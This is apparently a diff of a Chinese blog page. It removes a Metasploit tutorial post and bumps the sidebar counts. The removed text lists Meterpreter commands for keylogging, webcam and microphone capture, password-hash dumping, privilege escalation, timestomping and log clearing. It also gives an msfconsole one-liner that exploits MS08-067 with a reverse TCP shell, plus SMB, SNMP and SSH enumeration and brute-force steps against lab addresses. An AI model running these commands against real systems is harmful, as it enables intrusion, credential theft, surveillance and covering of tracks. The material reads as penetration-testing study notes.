-    kill          终止一个过程
-    localtime     显示目标系统的本地日期和时间
-    pgrep         按名称过滤进程
-    pkill         按名称终止进程
-    ps            列出运行的进程
-    reboot        重新启动远程计算机
-    reg           修改远程注册表并与之交互
-    rev2self      在远程机器上调用RevertToSelf（）
-    shell         放入系统命令外壳
-    shutdown      关闭远程计算机
-    steal_token   尝试从目标进程中盗取模拟令牌
-    suspend       暂停或恢复进程列表
-    sysinfo       获取有关远程系统的信息，例如OS
-
-
-Stdapi: 用户界面命令
-===============================
-
-    命令          描述
-    -------        -----------
-    enumdesktops   列出所有可访问的桌面和窗口工作站
-    getdesktop     获取当前meterpreter桌面
-    idletime       返回远程用户闲置的秒数
-    keyscan_dump   转储按键缓冲区
-    keyscan_start  开始捕捉击键
-    keyscan_stop   停止捕获击键
-    screenshot     获取交互式桌面的屏幕截图
-    setdesktop     更改meterpreters当前桌面
-    uictl          控制一些用户界面组件
-
-
-Stdapi: Webcam 命令
-=======================
-
-    命令          描述
-    -------        -----------
-    record_mic     从默认麦克风录制音频X秒
-    webcam_chat    开始视频聊天
-    webcam_list    列出网络摄像头
-    webcam_snap    从指定的摄像头拍摄快照
-    webcam_stream  从指定的摄像头播放视频流
-
-
-Priv: Elevate Commands
-======================
-
-    命令          描述
-    -------       -----------
-    getsystem     尝试将您的特权提升为本地系统的特权。
-
-
-Priv: 密码数据库命令
-================================
-
-    命令          描述
-    -------       -----------
-    hashdump      转储SAM数据库的内容
-
-
-Priv: Timestomp 命令
-========================
-
-    命令          描述
-    -------       -----------
-    timestomp     操纵文件MACE属性</code></pre><ul>
-<li>使用</li>
-</ul>
-<pre><code>meterpreter &gt; execute -f cmd.exe
-meterpreter &gt; ps
-meterpreter &gt; getuid
-meterpreter &gt; getpid
-meterpreter &gt; clearev   # 清除日志
-meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件
-
-meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
-msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -l
-msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1
-
-meterpreter &gt; hashdump  # 读取密码
-meterpreter &gt; run post/windows/gather/hashdump  # 读取密码
-
-meterpreter &gt; shell</code></pre><p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p>
-<h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul>
-<li>2015 年11月份，来自社区贡献</li>
-<li>无需运行环境，在客户端运行原生 python 代码</li>
-<li>使用</li>
-</ul>
-<pre><code>meterpreter &gt; load python
-meterpreter &gt; python_execute &quot;print (&#39;asdasdas&#39;)&quot;
-meterpreter &gt; python_execute &quot;import os; cd = os.getcwd()&quot; -r cd
-
-
-
-root@kali:~# cat find2.py 
-import os
-for root,dirs,files in os.walk(c://*):
-    for file in files:
-        if file.endwith(&quot;.ini&quot; ) and file.startwith(&quot;win&quot;):
-            print(os.path.john(root,file))
-python_import -f find.py</code></pre><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul>
-<li>2015 年6月已经被取消</li>
-<li>由 msfconsole -x 取代</li>
-<li>编写脚本时便于引用</li>
-</ul>
-<pre><code>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.147; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.131; set LPORT 5555; set target 34; exploit&quot;</code></pre><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul>
-<li>信息收集的模块都在 auxiliary/scanner/ 之下</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/ [TAB]
-Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul>
-<li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li>
-</ul>
-<pre><code>msf &gt; db_nmap -sV 10.10.10.0/24</code></pre><ul>
-<li>auxiliary 目录下</li>
-<li>RHOSTS &lt;&gt; RHOST<ul>
-<li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li>
-<li>也可以编写地址列表：file:/root/h.txt</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul>
-<li>use auxiliary/scanner/discovery/arp_sweep</li>
-<li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li>
-</ul>
-<pre><code>msf &gt; search arp
-msf &gt; use auxiliary/scanner/discovery/arp_sweep
-msf auxiliary(scanner/discovery/arp_sweep) &gt; show options 
-msf auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 10.10.10.0/24
-msf auxiliary(scanner/discovery/arp_sweep) &gt; set INTERFACE eth0
-msf auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 20
-msf auxiliary(scanner/discovery/arp_sweep) &gt; run</code></pre><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul>
-<li>use auxiliary/scanner/portscan/syn</li>
-<li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li>
-</ul>
-<pre><code>msf &gt; search portscan
-msf &gt; use auxiliary/scanner/portscan/syn
-msf auxiliary(scanner/portscan/syn) &gt; show options 
-msf auxiliary(scanner/portscan/syn) &gt; set INTERFACE eth0
-msf auxiliary(scanner/portscan/syn) &gt; set PORTS 80
-msf auxiliary(scanner/portscan/syn) &gt; set RHOSTS 10.10.10.0/24
-msf auxiliary(scanner/portscan/syn) &gt; set THREADS 50
-msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul>
-<li>查找 ipidseq 主机（查找僵尸机）<ul>
-<li>use auxiliary/scanner/ip/ipidseq</li>
-<li>set RHOSTS 192.168.1.0/24 ；run</li>
-<li>nmap -PN -sI 10.10.10.147 10.10.10.132</li>
-</ul>
-</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/ip/ipidseq
-msf auxiliary(scanner/ip/ipidseq) &gt; show options 
-msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150
-msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20
-msf auxiliary(scanner/ip/ipidseq) &gt; run</code></pre><pre><code>msf &gt; db_nmap -PN -sI 10.10.10.147 10.10.10.132</code></pre><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul>
-<li>use auxiliary/scanner/discovery/udp_sweep</li>
-<li>use auxiliary/scanner/discovery/udp_probe</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/discovery/udp_sweep
-msf auxiliary(scanner/discovery/udp_sweep) &gt; show options 
-msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 10.10.10.100-150
-msf auxiliary(scanner/discovery/udp_sweep) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probe
-msf auxiliary(scanner/discovery/udp_probe) &gt; show options 
-msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150
-msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131
-msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20
-msf auxiliary(scanner/discovery/udp_probe) &gt; run</code></pre><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul>
-<li>use auxiliary/sniffer/psnuffle</li>
-<li>支持从 pacap 抓包文件中提取密码</li>
-<li>功能类似于 dsniff</li>
-<li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li>
-</ul>
-<pre><code>msf &gt; search sniffer
-msf &gt; use auxiliary/sniffer/psnuffle
-msf auxiliary(sniffer/psnuffle) &gt; show options 
-msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0
-msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><pre><code>root@kali:~# ftp 10.10.10.148</code></pre><pre><code># 继续上述
-msf auxiliary(sniffer/psnuffle) &gt; show options
-msf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapng
-msf auxiliary(sniffer/psnuffle) &gt; jobs
-msf auxiliary(sniffer/psnuffle) &gt; kill 0
-msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul>
-<li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li>
-<li>use auxiliary/scanner/snmp/snmp_login</li>
-<li>use auxiliary/scanner/snmp/snmp_enum</li>
-<li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li>
-<li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_login
-msf auxiliary(scanner/snmp/snmp_login) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149
-msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20
-msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
-msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149
-msf auxiliary(scanner/snmp/snmp_enum) &gt; run
-</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
-msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）
-msf auxiliary(scanner/snmp/snmp_enum) &gt; run
-msf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）
-msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20
-msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumusers
-msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadmin
-msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142
-msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumshares
-msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options 
-msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadmin
-msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142
-msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul>
-<li>SMB 版本扫描<ul>
-<li>use auxiliary/scanner/smb/smb_version</li>
-</ul>
-</li>
-<li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul>
-<li>use auxiliary/scanner/smb/pipe_auditor</li>
-</ul>
-</li>
-<li>扫描通过 SMB 管道可以访问的 RCERPC 服务<ul>
-<li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li>
-</ul>
-</li>
-<li>SMB 共享账号（账号、密码）<ul>
-<li>use auxiliary/scanner/smb/smb_enumshares</li>
-</ul>
-</li>
-<li>SMB 用户枚举（账号、密码）<ul>
-<li>use auxiliary/scanner/smb/smb_enumusers</li>
-</ul>
-</li>
-<li>SID 枚举（账号、密码）<ul>
-<li>use auxiliary/scanner/smb/smb_lookupsid</li>
-</ul>
-</li>
-<li>SMB 版本扫描</li>
-</ul>
-<pre><code>msf &gt; search smb
-msf &gt; use auxiliary/scanner/smb/smb_version
-msf auxiliary(scanner/smb/smb_version) &gt; show options 
-msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142
-msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/smb_version) &gt; set SMBUSER Administrator
-msf auxiliary(scanner/smb/smb_version) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><ul>
-<li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_auditor
-msf auxiliary(scanner/smb/pipe_auditor) &gt; show options 
-msf auxiliary(scanner/smb/pipe_auditor) &gt; set RHOSTS 10.10.10.148
-msf auxiliary(scanner/smb/pipe_auditor) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBPass 123456</code></pre><ul>
-<li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditor
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show options 
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set RHOSTS 10.10.10.148
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><ul>
-<li>SMB 共享账号（账号、密码）</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumshares
-msf auxiliary(scanner/smb/smb_enumshares) &gt; show options 
-msf auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.148
-msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><ul>
-<li>SMB 用户枚举（账号、密码）</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumusers
-msf auxiliary(scanner/smb/smb_enumusers) &gt; show options 
-msf auxiliary(scanner/smb/smb_enumusers) &gt; set RHOSTS 10.10.10.148
-msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><ul>
-<li>SID 枚举（账号、密码）</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/smb/smb_lookupsid
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; show options 
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.148</code></pre><pre><code># 继续上述
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser Administrator
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass 123456
-msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul>
-<li>SSH 版本扫描<ul>
-<li>use auxiliary/scanner/ssh/ssh_version</li>
-</ul>
-</li>
-<li>SSH 密码爆破<ul>
-<li>use auxiliary/scanner/ssh/ssh_login<ul>
-<li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>SSH 公钥登陆<ul>
-<li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul>
-<li>set KEY_FILE id_rsa；set USERNAME root ；run</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>SSH 版本扫描</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_version
-msf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132
-msf auxiliary(scanner/ssh/ssh_version) &gt; run</code></pre><ul>
-<li>SSH 密码爆破</li>
-</ul>
-<pre><code>root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt 
-
-msf &gt; use auxiliary/scanner/ssh/ssh_login
-msf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132
-msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
-msf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false 
-msf auxiliary(scanner/ssh/ssh_login) &gt; run</code></pre><ul>
-<li>SSH 公钥登陆</li>
-</ul>
-<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey
-msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132
-msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME root
-msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</code></pre><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul>
-<li><p>基于已经取得的 session 进行检测</p>
-</li>
-<li><p>use post/windows/gather/enum_patches</p>
-<ul>
-<li>show advanced</li>
-<li>set VERBOSE yes</li>
-</ul>
-</li>
-<li><p>检查失败</p>
-<ul>
-<li>known bug in WMI query, try migrating to another process</li>
-<li>迁移到另一个进程再次进行尝试</li>
-</ul>
-</li>
-<li><p>ms08-067</p>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3802,7 +3124,7 @@ msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-count">40</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3824,7 +3146,7 @@ msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
